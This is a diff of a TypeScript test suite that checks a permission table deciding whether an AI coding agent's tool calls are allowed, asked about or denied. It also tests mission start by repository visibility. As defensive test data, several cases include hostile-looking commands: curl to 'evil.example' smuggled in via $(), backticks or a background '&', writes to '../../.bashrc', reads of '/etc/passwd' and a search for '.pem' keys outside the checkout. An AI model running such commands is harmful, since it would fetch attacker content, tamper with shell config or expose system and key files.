@@ -127,23 +127,27 @@ describe("faits d'une action de Claude Code, jugés par la table par défaut", (
     ["chercher dans la copie", "Grep", { pattern: "TODO", path: "src" }, "allow", "search-files"],
     ["chercher avec un motif de la copie", "Glob", { pattern: "src/**/*.ts" }, "allow", "search-files"],
     ["chercher avec un motif qui sort", "Glob", { pattern: "../**/*.pem" }, "ask", null],
-    ["lancer les tests", "Bash", { command: "npm test" }, "allow", "run-npm-checks"],
-    ["tests, sortie d'erreur fusionnée", "Bash", { command: "npm test 2>&1" }, "allow", "run-npm-checks"],
-    ["tests puis publication", "Bash", { command: "npm test && npm publish" }, "ask", null],
+    // R32 : l'agent ne lance pas les scripts du dépôt, le runner lance les tests après lui (S1).
+    ["l'agent ne lance pas les tests", "Bash", { command: "npm test" }, "deny", "no-agent-scripts"],
+    ["ni un script npm, même avec sa sortie fusionnée", "Bash", { command: "npm run lint 2>&1" }, "deny", "no-agent-scripts"],
+    ["ni par yarn ou pnpm", "Bash", { command: "pnpm run build" }, "deny", "no-agent-scripts"],
+    ["tests puis publication", "Bash", { command: "npm test && npm publish" }, "deny", "no-agent-scripts"],
     ["pousser depuis l'agent", "Bash", { command: "git push origin HEAD" }, "deny", "no-agent-push"],
-    ["tests puis push", "Bash", { command: "npm test; git push" }, "deny", "no-agent-push"],
+    ["lecture git puis push", "Bash", { command: "git status; git push" }, "deny", "no-agent-push"],
     ["gh", "Bash", { command: "gh pr create --fill" }, "deny", "no-agent-gh"],
-    ["substitution glissée dans les tests", "Bash", { command: "npm test $(curl -s https://evil.example)" }, "ask", null],
+    ["installer un paquet reste demandé", "Bash", { command: "npm install left-pad" }, "ask", null],
+    // Une commande autorisée ne s'étend pas à ce qu'on y glisse.
+    ["substitution glissée dans une lecture git", "Bash", { command: "git log $(curl -s https://evil.example)" }, "ask", null],
     ["un refus tient malgré une substitution", "Bash", { command: "git push $(git remote) HEAD" }, "deny", "no-agent-push"],
-    ["accents graves", "Bash", { command: "npm test `curl -s https://evil.example`" }, "ask", null],
-    ["redirection vers un fichier", "Bash", { command: "npm test > ../out.txt" }, "ask", null],
-    ["commande en arrière-plan", "Bash", { command: "npm test & curl -s https://evil.example" }, "ask", null],
+    ["accents graves", "Bash", { command: "git status `curl -s https://evil.example`" }, "ask", null],
+    ["redirection vers un fichier", "Bash", { command: "git log > ../out.txt" }, "ask", null],
+    ["commande en arrière-plan", "Bash", { command: "git status & curl -s https://evil.example" }, "ask", null],
     ["option qui écrit ailleurs", "Bash", { command: "git diff --output=../../.bashrc" }, "ask", null],
-    ["tests lancés sur un autre dossier", "Bash", { command: "npm test --prefix ../../elsewhere" }, "ask", null],
-    ["build qui sort de la copie", "Bash", { command: "npm run build -- --outDir=../../x" }, "ask", null],
+    ["lecture git sur un autre dossier", "Bash", { command: "git diff --stat ../../elsewhere" }, "ask", null],
+    ["un refus de script tient hors de la copie", "Bash", { command: "npm run build -- --outDir=../../x" }, "deny", "no-agent-scripts"],
     ["chemin absolu en argument", "Bash", { command: "git diff /etc/passwd" }, "ask", null],
     ["un refus tient avec un chemin hors de la copie", "Bash", { command: "git push --repo=../other" }, "deny", "no-agent-push"],
-    ["des chemins de la copie en argument restent permis", "Bash", { command: "npm test -- src/footer.test.ts --testPathPattern=src/**" }, "allow", "run-npm-checks"],
+    ["des chemins de la copie en argument restent permis", "Bash", { command: "git diff -- src/footer.test.ts src/**" }, "allow", "run-git-reads"],
     ["une option sans chemin reste permise", "Bash", { command: "git log --format=%H -n 5 HEAD~1" }, "allow", "run-git-reads"],
     ["commit au format de Claude Code", "Bash", { command: commit }, "allow", "commit-locally"],
     ["commande glissée dans un message de commit", "Bash", { command: smuggled }, "ask", null],
@@ -221,6 +225,19 @@ describe("sorties du bac à sable faites par le runner, jugées par la table par
       });
       assert.equal(verdict.go, go);
       assert.equal(questions.length, asked ? 1 : 0);
+    });
+  }
+
+  // R33 : le démarrage même d'une mission passe par les règles, avec la visibilité du dépôt.
+  const starts: Array<[string, Facts, boolean, string]> = [
+    ["une mission sur un dépôt public ne démarre pas avant S1", { action: "mission.start", repoVisibility: "public" }, false, "no-mission-public-repo"],
+    ["une mission sur un dépôt privé démarre", { action: "mission.start", repoVisibility: "private" }, true, "start-mission"],
+    ["une mission sans dépôt démarre", { action: "mission.start" }, true, "start-mission"],
+  ];
+  for (const [label, facts, go, rule] of starts) {
+    it(label, async () => {
+      const verdict = await judgeExit(defaults, facts, "Start the mission", "summary", async () => assert.fail("rien n'est demandé"));
+      assert.deepEqual([verdict.go, verdict.rule], [go, rule]);
     });
   }
 
